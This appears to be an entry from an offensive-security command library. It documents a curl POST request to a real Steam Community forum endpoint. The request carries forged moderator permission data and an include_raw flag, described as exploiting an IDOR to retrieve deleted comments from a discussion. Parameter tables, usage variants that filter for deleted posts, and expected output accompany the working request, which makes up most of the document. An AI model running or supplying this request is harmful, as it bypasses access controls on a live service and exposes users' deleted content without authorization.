---
data: >-
  curl -X POST
  'https://steamcommunity.com/comment/ForumTopic/delete/103582791461362746/1692659135923574526/'
  -H 'Cookie: ***member-cookies***' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=1692659769940104935&oldestfirst=true&include_raw=true'
tags:
  - idor
  - exploit
  - http
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:56.658Z'
id: 8354e9b2-0a8e-4e39-b857-b03bb5c40803
verified: false
validated: true
submitted: true
---
# steam-comment-fetch-member

## Command

```bash
curl -X POST 'https://steamcommunity.com/comment/ForumTopic/delete/103582791461362746/1692659135923574526/' \
  -H 'Cookie: ***member-cookies***' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'gidcomment=00000&comment=boom...x&start=0&count=15&sessionid=***&extended_data=%7B%22topic_permissions%22%3A%7B%22can_view%22%3A1%2C%22can_post%22%3A0%2C%22can_reply%22%3A0%2C%22can_moderate%22%3A1%2C%22can_edit_others_posts%22%3A1%2C%22can_purge_topics%22%3A1%2C%22is_banned%22%3A0%2C%22can_delete%22%3A1%2C%22can_edit%22%3A1%7D%2C%22original_poster%22%3A0%2C%22topic_gidanswer%22%3A%220%22%2C%22forum_appid%22%3A0%2C%22forum_public%22%3A0%2C%22forum_type%22%3A%22General%22%2C%22forum_gidfeature%22%3A%220%22%7D&feature2=1692659769940104935&oldestfirst=true&include_raw=true'
```

## Description

This cURL command sends a POST request to the Steam forum comment endpoint using member cookies to exploit IDOR and fetch all comments, including deleted ones, for a specific discussion.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `URL path` | Endpoint with GroupID and forumID | Yes |
| `-H 'Cookie: ***member-cookies***'` | Member session authentication | Yes |
| `-d 'gidcomment=00000'` | Placeholder for comment group ID | Yes |
| `-d 'comment=boom...x'` | Search placeholder | Yes |
| `-d 'start=0'` | Pagination offset | Yes |
| `-d 'count=15'` | Number of comments to fetch | Yes |
| `-d 'sessionid=***'` | User session ID | Yes |
| `-d 'extended_data=...'` | JSON with permissions and metadata | Yes |
| `-d 'feature2=1692659769940104935'` | Discussion ID (IDOR vector) | Yes |
| `-d 'oldestfirst=true'` | Sort order | Yes |
| `-d 'include_raw=true'` | Include raw/deleted data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://steamcommunity.com/comment/ForumTopic/delete/{GroupID}/{forumID}/' -H 'Cookie: ***member-cookies***' -d '...' # Replace placeholders
```

### Advanced Usage

Use with silent output and JSON parsing: ```bash
curl -s -X POST ... | jq '.comments_raw[] | select(.deleted == true)'
```

## Expected Output

JSON response like {"success":1,"comments_raw":[{"comment_id":"...","text":"Deleted content","deleted":true}, ...]}

## Related

- [[commands/steam-comment-fetch-nonmember]]
- [[procedures/Exploit-IDOR-to-Access-Deleted-Comments-as-Member]]
